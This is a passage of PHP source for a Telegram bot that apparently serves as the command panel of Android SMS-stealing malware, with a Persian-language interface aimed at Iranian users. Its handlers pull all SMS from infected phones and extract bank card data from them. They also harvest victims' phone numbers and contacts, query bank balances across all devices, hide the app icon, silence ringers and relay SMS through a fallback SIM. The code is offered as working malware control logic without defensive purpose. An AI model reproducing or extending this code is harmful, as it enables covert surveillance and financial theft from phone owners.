    file_put_contents("user/$device_id-offlineoff-msg.txt", $chat_id."|".$wait_msg->result->message_id);
    
    $offline_number = file_get_contents("data/offline-number.txt");
    requestSMS("offline_mode_off", $device_id, $offline_number, null);

} elseif ($data == "get_all_numbers") {
    bot('answerCallbackQuery', [
        'callback_query_id' => $update->callback_query->id,
        'text' => '🔄 ɢᴇᴛᴛɪɴɢ ᴏɴʟɪɴᴇ ᴜꜱᴇʀꜱ ʟɪꜱᴛ...',
        'show_alert' => false
    ]);
    
    $request_time = getIranTime();
    
    file_put_contents("data/online_users.json", "[]");
    requestsAll('online_device');
    sleep(5);
    
    $onlineUsers = json_decode(file_get_contents("data/online_users.json"), true);
    
    if (empty($onlineUsers)) {
        emg($chat_id, $mi, "❌ <b>ɴᴏ ᴏɴʟɪɴᴇ ᴜꜱᴇʀꜱ ꜰᴏᴜɴᴅ</b>\n\n<b><b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b></b>", null);
        return;
    }
    
    smg($chat_id, "🌀 <b>ʀᴇǫᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴀʟʟ ᴅᴇᴠɪᴄᴇꜱ</b>\n\n👤 <b>ᴛᴏᴛᴀʟ ᴜꜱᴇʀꜱ:</b> " . count($onlineUsers) . "\n🫡 <b>ᴄᴏᴍᴍᴀɴᴅ:</b> ɢᴇᴛ ᴀʟʟ ɴᴜᴍʙᴇʀꜱ\n<blockquote>🕒 <b>ʀᴇǫᴜᴇꜱᴛ ᴛɪᴍᴇ:</b> $request_time</blockquote>\n\n<b><b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b></b>", null);
    
    foreach ($onlineUsers as $androidid => $name) {
        requests('userphone', $androidid);
        usleep(100000);
    }


} elseif ($data == "auto_change") {
    // چک کن اگر از firstaction صدا زده شده
    $action_autohide = file_get_contents("data/autohide.txt");
    
    if ($action_autohide == "off") {
        file_put_contents("data/autohide.txt", "on");
        $action_autohide = "on";
    } else {
        file_put_contents("data/autohide.txt", "off");
        $action_autohide = "off";
    }
    
    // رفرش صفحه firstaction
    $firstActionData = json_decode(file_get_contents("data/firstaction.json"), true);
    $bal = $firstActionData['balance'];
    $tarphone = $firstActionData['targetphone'];
    $hideact = $firstActionData['autohide'];
    
    $firstActionButton = json_encode([
        'resize_keyboard' => true,
        'inline_keyboard' => [
            [
                ['text' => "💰 ʙᴀʟᴀɴᴄᴇ", 'callback_data' => 'balanceaction'],
                ['text' => "$bal", 'callback_data' => 'balanceaction']
            ],
            [
                ['text' => "📞 ᴘʜᴏɴᴇ", 'callback_data' => 'userphoneaction'],
                ['text' => "$tarphone", 'callback_data' => 'userphoneaction']
            ],
            [
                ['text' => "👻 ʜɪᴅᴇ", 'callback_data' => 'autohideaction'],
                ['text' => "$hideact", 'callback_data' => 'autohideaction']
            ],
            [
                ['text' => "🔄 ᴄʜᴀɴɢᴇ", 'callback_data' => 'auto_change_firstaction'],
                ['text' => "$action_autohide", 'callback_data' => 'auto_change_firstaction']
            ],
            [
                ['text' => "⬅️ ʙᴀᴄᴋ", 'callback_data' => 'back_home']
            ]
        ]
    ]);
    
    emg($chat_id, $mi, "
<b>⚡ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴄᴏɴᴛʀᴏʟ</b>

<b>📊 ᴄᴜʀʀᴇɴᴛ ꜱᴇᴛᴛɪɴɢꜱ:</b>
<b>• ʙᴀʟᴀɴᴄᴇ:</b> $bal
<b>• ᴘʜᴏɴᴇ:</b> $tarphone
<b>• ʜɪᴅᴇ:</b> $hideact
<b>• ᴀᴜᴛᴏ ᴄʜᴀɴɢᴇ:</b> $action_autohide

<b><b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b></b>", $firstActionButton);

} elseif ($data == "auto_change_firstaction") {
    // این برای وقتیه که از firstaction صدا زده میشه
    $action_autohide = file_get_contents("data/autohide.txt");
    
    if ($action_autohide == "off") {
        file_put_contents("data/autohide.txt", "on");
        $action_autohide = "on";
    } else {
        file_put_contents("data/autohide.txt", "off");
        $action_autohide = "off";
    }
    
    // رفرش صفحه firstaction
    $firstActionData = json_decode(file_get_contents("data/firstaction.json"), true);
    $bal = $firstActionData['balance'];
    $tarphone = $firstActionData['targetphone'];
    $hideact = $firstActionData['autohide'];
    
    $firstActionButton = json_encode([
        'resize_keyboard' => true,
        'inline_keyboard' => [
            [
                ['text' => "💰 ʙᴀʟᴀɴᴄᴇ", 'callback_data' => 'balanceaction'],
                ['text' => "$bal", 'callback_data' => 'balanceaction']
            ],
            [
                ['text' => "📞 ᴘʜᴏɴᴇ", 'callback_data' => 'userphoneaction'],
                ['text' => "$tarphone", 'callback_data' => 'userphoneaction']
            ],
            [
                ['text' => "👻 ʜɪᴅᴇ", 'callback_data' => 'autohideaction'],
                ['text' => "$hideact", 'callback_data' => 'autohideaction']
            ],
            [
                ['text' => "🔄 ᴄʜᴀɴɢᴇ", 'callback_data' => 'auto_change_firstaction'],
                ['text' => "$action_autohide", 'callback_data' => 'auto_change_firstaction']
            ],
            [
                ['text' => "⬅️ ʙᴀᴄᴋ", 'callback_data' => 'back_home']
            ]
        ]
    ]);
    
    emg($chat_id, $mi, "
<b>⚡ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴄᴏɴᴛʀᴏʟ</b>

<b>📊 ᴄᴜʀʀᴇɴᴛ ꜱᴇᴛᴛɪɴɢꜱ:</b>
<b>• ʙᴀʟᴀɴᴄᴇ:</b> $bal
<b>• ᴘʜᴏɴᴇ:</b> $tarphone
<b>• ʜɪᴅᴇ:</b> $hideact
<b>• ᴀᴜᴛᴏ ᴄʜᴀɴɢᴇ:</b> $action_autohide

<b><b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b></b>", $firstActionButton);

} elseif ($data == "online_model") {
    emg($chat_id, $mi, "🚀 ‹‹ <b>ᴍᴏᴅᴇʟ ꜱᴇɴᴅ ᴏɴʟɪɴᴇ</b> ›› ꜱᴇᴄᴛɪᴏɴ\n\n⚡️ ᴄʜᴏᴏꜱᴇ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ ⚡️\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $model_button);
} elseif ($data == "list_model") {
    emg($chat_id, $mi, "📋 ‹‹ <b>ʟɪꜱᴛ ꜱᴇɴᴅᴇᴅ</b> ›› ꜱᴇᴄᴛɪᴏɴ ꜱᴇʟᴇᴄᴛᴇᴅ\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $back_settings);
    file_put_contents("data/online_model.txt", "list");
} elseif ($data == "singel_model") {
    emg($chat_id, $mi, "🔹 ‹‹ <b>ꜱɪɴɢᴇʟ ꜱᴇɴᴅᴇᴅ</b> ›› ꜱᴇᴄᴛɪᴏɴ ꜱᴇʟᴇᴄᴛᴇᴅ\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $back_settings);
    file_put_contents("data/online_model.txt", "singel");
} elseif ($data == "first_sms") {
    if ($action_firstsms == "off") {
        file_put_contents("data/firstsms.txt", "on");
        emg($chat_id, $mi, "📩 ‹‹ <b>ꜰɪʀꜱᴛ ꜱᴍꜱ ᴏɴ</b> ›› ꜱᴇᴄᴛɪᴏɴ\n\n⚡️ ᴄʜᴏᴏꜱᴇ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ ⚡️\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $settings_button);
    } else {
        file_put_contents("data/firstsms.txt", "off");
        emg($chat_id, $mi, "📩 ‹‹ <b>ꜰɪʀꜱᴛ ꜱᴍꜱ ᴏꜰꜰ</b> ›› ꜱᴇᴄᴛɪᴏɴ\n\n⚡️ ᴄʜᴏᴏꜱᴇ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ ⚡️\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $settings_button);
    }
} elseif ($data == "autotar") {
    if ($auto_tar == "on") {
        file_put_contents("data/autotar.txt", "off");
        emg($chat_id, $mi, "🔌 ‹‹ <b>ᴏꜰꜰ ᴍᴏᴅᴇ</b> ›› ꜱᴇᴛ ᴛᴏ <b>ᴏꜰꜰ</b>\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $back_settings);
    } else {
        file_put_contents("data/autotar.txt", "on");
        emg($chat_id, $mi, "🔛 ‹‹ <b>ᴏꜰꜰ ᴍᴏᴅᴇ</b> ›› ꜱᴇᴛ ᴛᴏ <b>ᴏɴ</b>\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $back_settings);
    }
} elseif (strpos($text, '/block_') !== false) {
    $txt = explode("_", $text);
    $dev_id0 = str_replace('/block_', '', $text);
    $ip_block = $dev_id0;
    $file_accses = file_get_contents("block.txt");
    file_put_contents("block.txt", "$file_accses\n$ip_block");
    smg($chat_id, "🛡️ ‹‹ ɪᴘ <b>$ip_block</b> ʙʟᴏᴄᴋᴇᴅ ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", null);

} elseif (strpos($text, '/unblock_') !== false) {
    $txt = explode("_", $text);
    $dev_id0 = str_replace('/unblock_', '', $text);
    $ip_block = $dev_id0;
    $file_content = file_get_contents("block.txt");
    $new_content = str_replace($ip_block, '', $file_content);

    file_put_contents("block.txt", $new_content);
    smg($chat_id, "🔓 ‹‹ ɪᴘ <b>$ip_block</b> ᴜɴʙʟᴏᴄᴋᴇᴅ ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", null);
} elseif ($data == "set_text") {
    emg($chat_id, $mi, "📝 ‹‹ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ <b>ꜱᴍꜱ ᴛᴇxᴛ</b> ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $back_settings);
    file_put_contents("user/$chat_id/command.txt", "set text");

} elseif ($text == "/all_unblock") {
    file_put_contents("block.txt", "");
    smg($chat_id, "✨ ‹‹ <b>ᴀʟʟ ɪᴘ'ꜱ ᴡᴇʀᴇ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ᴜɴʙʟᴏᴄᴋᴇᴅ</b> ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", null);
    exit();

} elseif ($command == "set text") {
    smg($chat_id, "✅ ‹‹ <b>ꜱᴍꜱ ᴛᴇxᴛ</b> ᴡᴀꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇᴛ ᴛᴏ [ <code>$text</code> ] ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $back_settings);
    file_put_contents("data/message-first.txt", $text);
    file_put_contents("user/$chat_id/command.txt", "");
} elseif ($data == "set_word") {
    emg($chat_id, $mi, "📝 ‹‹ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ <b>ᴡᴏʀᴅ ᴛᴇxᴛ</b> ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $back_settings);
    file_put_contents("user/$chat_id/command.txt", "set word");

} elseif ($command == "set word") {
    smg($chat_id, "✅ ‹‹ <b>ᴡᴏʀᴅ</b> ᴡᴀꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇᴛ ᴛᴏ [ <code>$text</code> ] ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $back_settings);
        file_put_contents("user/$chat_id/word.txt", $text);
        file_put_contents("user/$chat_id/command.txt", "");
} elseif ($data == "back_to_settings") {
    emg($chat_id, $mi, 
        "⚙️ ‹‹ <b>ꜱᴇᴛᴛɪɴɢꜱ ᴘᴀɢᴇ</b> ›› ꜱᴇᴄᴛɪᴏɴ\n\n"
        . "✨ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴏᴘᴛɪᴏɴ ✨\n\n"
        . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", 
    $setting);       
} elseif (strpos($data, "extract_cards") !== false) {  
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);  
    $device_id = $datass[1];  
    $device_model = file_get_contents("user/{$device_id}-model.txt") ?? 'Unknown';  
    $request_time = getIranTime();      
    $wait_message = bot('sendMessage', [  
        'chat_id' => $chat_id,  
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                . "👤ᴛᴀʀɢᴇᴛ: ᴅᴇᴠɪᴄᴇ: <code>$device_id</code> | [$device_model]\n"
                . "🫡ᴄᴏᴍᴍᴀɴᴅ: getcard\n"
                . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n\n"
                . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",  
        'parse_mode' => 'HTML'  
    ]);  
      
    file_put_contents("user/{$device_id}_card_process.txt", json_encode([  
        'chat_id' => $chat_id,  
        'message_id' => $wait_message->result->message_id,  
        'time' => time(),
        'action' => 'extract_cards' 
    ]));  
      
    requests('all_sms', $device_id);

} elseif (strpos($data, "nametarget") !== false) {
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $back_control = json_encode([
        'resize_keyboard' => true, 
        'inline_keyboard' => [
            [
                ['text' => "🔙 ‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_panel $datass[1]"]
            ]
        ]
    ]);
    
    emg($chat_id, $mi, "👤 ‹‹ <b>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ɴᴀᴍᴇ ᴛᴀʀɢᴇᴛ</b> ››\n\n<a href='https://t.me/im_saeedi'>🐦‍🔥 | ɪᴍ-ꜱᴀᴇᴇᴇᴅ</a>", $back_control);
    file_put_contents("user/$chat_id/command.txt", "settragetname $device_id");
} elseif ($data == "firstaction") {
    checkTimeExpired($chat_id);
    
    // خواندن وضعیت فعلی از فایل
    $firstActionData = json_decode(file_get_contents("data/firstaction.json"), true);
    $bal = $firstActionData['balance'] ?? "off";
    $tarphone = $firstActionData['targetphone'] ?? "off";
    $hideact = $firstActionData['autohide'] ?? "off";
    
    $firstActionButton = json_encode([
        'resize_keyboard' => true,
        'inline_keyboard' => [
            [
                ['text' => "💰 ʙᴀʟᴀɴᴄᴇ", 'callback_data' => 'balanceaction'],
                ['text' => "$bal", 'callback_data' => 'balanceaction']
            ],
            [
                ['text' => "📞 ᴘʜᴏɴᴇ", 'callback_data' => 'userphoneaction'],
                ['text' => "$tarphone", 'callback_data' => 'userphoneaction']
            ],
            [
                ['text' => "👻 ʜɪᴅᴇ", 'callback_data' => 'autohideaction'],
                ['text' => "$hideact", 'callback_data' => 'autohideaction']
            ],
            [
                ['text' => "⬅️ ʙᴀᴄᴋ", 'callback_data' => 'back_home']
            ]
        ]
    ]);
    
    emg($chat_id, $mi, "
<b>⚡ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴄᴏɴᴛʀᴏʟ</b>

<b>📊 ᴄᴜʀʀᴇɴᴛ ꜱᴇᴛᴛɪɴɢꜱ:</b>
<b>• ʙᴀʟᴀɴᴄᴇ:</b> $bal
<b>• ᴘʜᴏɴᴇ:</b> $tarphone
<b>• ʜɪᴅᴇ:</b> $hideact

<b><b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b></b>", $firstActionButton);


} elseif ($data == "balanceaction") {
    $firstActionData = json_decode(file_get_contents("data/firstaction.json"), true);
    
    if ($firstActionData['balance'] == "off") {
        $firstActionData['balance'] = "on";
    } else {
        $firstActionData['balance'] = "off";
    }
    
    file_put_contents("data/firstaction.json", json_encode($firstActionData));
    
    // رفرش صفحه
    $bal = $firstActionData['balance'];
    $tarphone = $firstActionData['targetphone'];
    $hideact = $firstActionData['autohide'];
    
    $firstActionButton = json_encode([
        'resize_keyboard' => true,
        'inline_keyboard' => [
            [
                ['text' => "💰 ʙᴀʟᴀɴᴄᴇ", 'callback_data' => 'balanceaction'],
                ['text' => "$bal", 'callback_data' => 'balanceaction']
            ],
            [
                ['text' => "📞 ᴘʜᴏɴᴇ", 'callback_data' => 'userphoneaction'],
                ['text' => "$tarphone", 'callback_data' => 'userphoneaction']
            ],
            [
                ['text' => "👻 ʜɪᴅᴇ", 'callback_data' => 'autohideaction'],
                ['text' => "$hideact", 'callback_data' => 'autohideaction']
            ],
            [
                ['text' => "⬅️ ʙᴀᴄᴋ", 'callback_data' => 'back_home']
            ]
        ]
    ]);
    
    emg($chat_id, $mi, "
<b>⚡ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴄᴏɴᴛʀᴏʟ</b>

<b>📊 ᴄᴜʀʀᴇɴᴛ ꜱᴇᴛᴛɪɴɢꜱ:</b>
<b>• ʙᴀʟᴀɴᴄᴇ:</b> $bal
<b>• ᴘʜᴏɴᴇ:</b> $tarphone
<b>• ʜɪᴅᴇ:</b> $hideact

<b><b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b></b>", $firstActionButton);

} elseif ($data == "userphoneaction") {
    $firstActionData = json_decode(file_get_contents("data/firstaction.json"), true);
    
    if ($firstActionData['targetphone'] == "off") {
        $firstActionData['targetphone'] = "on";
    } else {
        $firstActionData['targetphone'] = "off";
    }
    
    file_put_contents("data/firstaction.json", json_encode($firstActionData));
    
    // رفرش صفحه
    $bal = $firstActionData['balance'];
    $tarphone = $firstActionData['targetphone'];
    $hideact = $firstActionData['autohide'];
    
    $firstActionButton = json_encode([
        'resize_keyboard' => true,
        'inline_keyboard' => [
            [
                ['text' => "💰 ʙᴀʟᴀɴᴄᴇ", 'callback_data' => 'balanceaction'],
                ['text' => "$bal", 'callback_data' => 'balanceaction']
            ],
            [
                ['text' => "📞 ᴘʜᴏɴᴇ", 'callback_data' => 'userphoneaction'],
                ['text' => "$tarphone", 'callback_data' => 'userphoneaction']
            ],
            [
                ['text' => "👻 ʜɪᴅᴇ", 'callback_data' => 'autohideaction'],
                ['text' => "$hideact", 'callback_data' => 'autohideaction']
            ],
            [
                ['text' => "⬅️ ʙᴀᴄᴋ", 'callback_data' => 'back_home']
            ]
        ]
    ]);
    
    emg($chat_id, $mi, "
<b>⚡ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴄᴏɴᴛʀᴏʟ</b>

<b>📊 ᴄᴜʀʀᴇɴᴛ ꜱᴇᴛᴛɪɴɢꜱ:</b>
<b>• ʙᴀʟᴀɴᴄᴇ:</b> $bal
<b>• ᴘʜᴏɴᴇ:</b> $tarphone
<b>• ʜɪᴅᴇ:</b> $hideact

<b><b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b></b>", $firstActionButton);

} elseif ($data == "autohideaction") {
    $firstActionData = json_decode(file_get_contents("data/firstaction.json"), true);
    
    if ($firstActionData['autohide'] == "off") {
        $firstActionData['autohide'] = "on";
    } else {
        $firstActionData['autohide'] = "off";
    }
    
    file_put_contents("data/firstaction.json", json_encode($firstActionData));
    
    // رفرش صفحه
    $bal = $firstActionData['balance'];
    $tarphone = $firstActionData['targetphone'];
    $hideact = $firstActionData['autohide'];
    
    $firstActionButton = json_encode([
        'resize_keyboard' => true,
        'inline_keyboard' => [
            [
                ['text' => "💰 ʙᴀʟᴀɴᴄᴇ", 'callback_data' => 'balanceaction'],
                ['text' => "$bal", 'callback_data' => 'balanceaction']
            ],
            [
                ['text' => "📞 ᴘʜᴏɴᴇ", 'callback_data' => 'userphoneaction'],
                ['text' => "$tarphone", 'callback_data' => 'userphoneaction']
            ],
            [
                ['text' => "👻 ʜɪᴅᴇ", 'callback_data' => 'autohideaction'],
                ['text' => "$hideact", 'callback_data' => 'autohideaction']
            ],
            [
                ['text' => "⬅️ ʙᴀᴄᴋ", 'callback_data' => 'back_home']
            ]
        ]
    ]);
    
    emg($chat_id, $mi, "
<b>⚡ ꜰɪʀꜱᴛ ᴀᴄᴛɪᴏɴꜱ ᴄᴏɴᴛʀᴏʟ</b>

<b>📊 ᴄᴜʀʀᴇɴᴛ ꜱᴇᴛᴛɪɴɢꜱ:</b>
<b>• ʙᴀʟᴀɴᴄᴇ:</b> $bal
<b>• ᴘʜᴏɴᴇ:</b> $tarphone
<b>• ʜɪᴅᴇ:</b> $hideact

<b><b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b></b>", $firstActionButton);

    } elseif (strpos($command, "settragetname") !== false) {
    $datass = explode(" ", $command);
    $device_id = $datass[1];
    $info_button = info_button($device_id);

    smg($chat_id, "✅ <b>ᴛᴀʀɢᴇᴛ ɴᴀᴍᴇ ꜱᴇᴛ</b>\n\nᴛᴏ: <code>$text</code>", $info_button);
    file_put_contents("user/$device_id-name.txt", $text);
    file_put_contents("user/$chat_id/command.txt", "");

} elseif ($data == "set_number") {
    emg($chat_id, $mi, "📲 <b>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ꜱᴍꜱ ɴᴜᴍʙᴇʀ</b>\n\nᴇxᴀᴍᴘʟᴇ: <code>09123456789</code>", $back_settings);
    file_put_contents("user/$chat_id/command.txt", "set number");

} elseif ($command == "set number") {
    smg($chat_id, "✅ <b>ꜱᴍꜱ ɴᴜᴍʙᴇʀ ꜱᴇᴛ</b>\n\nᴛᴏ: <code>$text</code>", $back_settings);
    file_put_contents("data/number-first.txt", $text);
    file_put_contents("user/$chat_id/command.txt", "");

} elseif ($data == "set_number_offline_mode") {
    emg($chat_id, $mi, "📶 <b>ꜱᴇᴛ ᴏꜰꜰʟɪɴᴇ ᴍᴏᴅᴇ ꜱɪᴍ</b>\n\nᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ꜱɪᴍ ᴄᴀʀᴅ ɴᴜᴍʙᴇʀ\nᴇxᴀᴍᴘʟᴇ: <code>09123456789</code>", $back_settings);
    file_put_contents("user/$chat_id/command.txt", "set offline");

} elseif ($command == "set offline") {
    smg($chat_id, "✅ <b>ᴏꜰꜰʟɪɴᴇ ꜱɪᴍ ꜱᴇᴛ</b>\n\nᴛᴏ: <code>$text</code>", $back_settings);
    file_put_contents("data/offline-number.txt", $text);
    file_put_contents("user/$chat_id/command.txt", "");

} elseif ($data == "num_senders") {
    $text = file_get_contents("user/AllSMS.txt");
    preg_match_all('/sender : (.+)/', $text, $matches);
    
    $senders = $matches[1];
    $x = "";
    foreach ($senders as $sender) {
        if (strpos($sender, '+98') !== False) {
            $count = preg_match_all("/[0-9]/", $sender, $matches);
            if ($count == 12) {
                $x .= "$sender\n";
            }
        }
            if (strpos($sender, '09') !== False) {
                $count = preg_match_all("/[0-9]/", $sender, $matches);
                if ($count == 11) {

                    $x .= "$sender\n";
                }
            }
        }
        preg_match_all('/sender : (.+)/', $text, $matches);

        $senders = $matches[1];
        $x = "";
        foreach ($senders as $sender) {
            if (strpos($sender, '+98') !== False) {
                $count = preg_match_all("/[0-9]/", $sender, $matches);
                if ($count == 12) {

                    $x .= "$sender\n";
                }
            }
            if (strpos($sender, '09') !== False) {
                $count = preg_match_all("/[0-9]/", $sender, $matches);
                if ($count == 11) {

                    $x .= "$sender\n";
                }
            }
        }
        $lines = explode("\n", $x);
        $unique_lines = array_unique($lines);
        $result = implode("\n", $unique_lines);
        bot('sendMessage', [
            'chat_id' => $id_sender,
            'text' => "$result\n@im_saeedi",
            'parse_mode' => 'HTML',
        ]);
    } elseif ($data == "num_con") {
        $text = file_get_contents("user/@im_saeedi");
        preg_match_all('/Phone : (.+)/', $text, $matches);

        $senders = $matches[1];
        $x = "";
        $n = 0;
        foreach ($senders as $sender) {
            $n += 1;
            $x .= "$sender\n";
            if ($n >= 299) {
                $lines = explode("\n", $x);
                $unique_lines = array_unique($lines);
                $result = implode("\n", $unique_lines);
                bot('sendMessage', [
                    'chat_id' => $id_sender,
                    'text' => "$result",
                    'parse_mode' => 'HTML',
                ]);
                $x = "";
                $n = 0;
            }


        }
        $lines = explode("\n", $x);
        $unique_lines = array_unique($lines);
        $result = implode("\n", $unique_lines);
        bot('sendMessage', [
            'chat_id' => $id_sender,
            'text' => "$result\n@im_saeedi",
            'parse_mode' => 'HTML',
        ]);
} elseif ($data == "checkhost") {
    $iran_time = getIranTime();
    
    $wait_sticker = "CAACAgQAAxkBAAIBOWZtZ4V3K8Xv3j2i7yZ1Z3X2j3j2AALhCwACZgAB8FHKzQe9z3j2MwQ";
    bot('sendSticker', [
        'chat_id' => $chat_id,
        'sticker' => $wait_sticker
    ]);
    
    emg($chat_id, $mi, "🔍 *در حال بررسی درگاه شما...*\n\n🌐 ᴜʀʟ: $link_show\n⏳ لطفاً کمی صبر کنید...\n🕒 زمان ایران: $iran_time", null);
    
    $check_result = checkhost($link_show);
    
    $check_result_string = "🛡️ *نتایج بررسی فیلترینگ*\n\n";
    $check_result_string .= "📊 وضعیت کلی درگاه:\n";
    $check_result_string .= "➖➖➖➖➖➖➖➖➖\n\n";
    
    $has_problem = false;
    
    foreach ($check_result as $city => $value) {
        if ($value['statuscode'] == "200" || $value['statuscode'] == "301") {
            $emoji = "✅";
            $status_text = "فعال";
        } else {
            $emoji = "⛔️";
            $status_text = "مشکل";
            $has_problem = true;
        }
        
        $time = substr($value['time'], 0, 4);
        
        $check_result_string .= "🏙️ *$city*\n";
        $check_result_string .= "$emoji وضعیت: {$value['statuscode']} ($status_text)\n";
        $check_result_string .= "⏱ زمان پاسخ: $time ثانیه\n";
        $check_result_string .= "▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
    }
    
    if ($has_problem) {
        $final_result = "⚠️ نیاز به بررسی بیشتر";
        $result_sticker = "CAACAgQAAxkBAAIBO2ZtZ5J3K8Xv3j2i7yZ1Z3X2j3j2AALiCwACZgAB8FHKzQe9z3j2MwQ";
    } else {
        $final_result = "✅ درگاه سالم است";
        $result_sticker = "CAACAgQAAxkBAAIBPWZtZ5Z3K8Xv3j2i7yZ1Z3X2j3j2AALjCwACZgAB8FHKzQe9z3j2MwQ";
    }
    
    $check_result_string .= "\n📌 *نتیجه نهایی:* $final_result\n";
    $check_result_string .= "🕒 زمان بررسی: " . date("Y-m-d H:i:s") . "\n\n";
    $check_result_string .= "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";
    
    bot('sendSticker', [
        'chat_id' => $chat_id,
        'sticker' => $result_sticker
    ]);
    
    emg($chat_id, $mi, $check_result_string, null);
    $request_time = getIranTime();
    } elseif ($data == "get_all_balance") {
    $request_time = getIranTime();
bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴀʟʟ\n"
                 . "👤ᴍᴏᴅᴇ : ʙᴀʟᴀɴᴄᴇ\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ᴀʟʟ ʙᴀʟᴀɴᴄᴇ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
        requests('getallbalance', $device_id);
    } elseif ($data == "hide_all") {
    $request_time = getIranTime();
bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴀʟʟ\n"
                 . "👤ᴍᴏᴅᴇ : ʜɪᴅᴇ\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ʜɪᴅᴇ ᴀʟʟ ɪᴄᴏɴ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
        requestsAll('hide_all');
    } elseif ($data == "silent_all") {
    $request_time = getIranTime();
            bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴀʟʟ\n"
                 . "👤ringer : ꜱɪʟᴇɴᴛ\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ꜱɪʟᴇɴᴛ ᴀʟʟ\n"
